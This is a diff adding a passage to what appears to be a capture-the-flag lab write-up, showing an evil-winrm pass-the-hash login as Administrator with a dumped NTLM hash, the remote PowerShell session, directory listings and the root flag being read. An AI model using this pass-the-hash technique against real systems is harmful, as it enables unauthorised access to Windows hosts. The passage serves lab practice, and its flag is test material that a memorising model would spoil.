@@ -1582,6 +1582,49 @@ Administrator:des-cbc-md5:13a8c8abc12f945e
 
 ```
 
+```
+evil-winrm -i 10.129.50.211 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         5/19/2022   2:32 AM                WindowsPowerShell
+-a----         7/22/2022   3:55 AM           1479 clean.ps1
+-a----         1/18/2024   5:27 AM            152 ldap.ps1
+-a----         7/22/2022   3:54 AM         770279 PowerView.ps1
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         7/13/2026   5:29 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+11e43cf5545779de8d02cb4136ad2b3b
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+
+```
+
 
 
 ### Exploitation
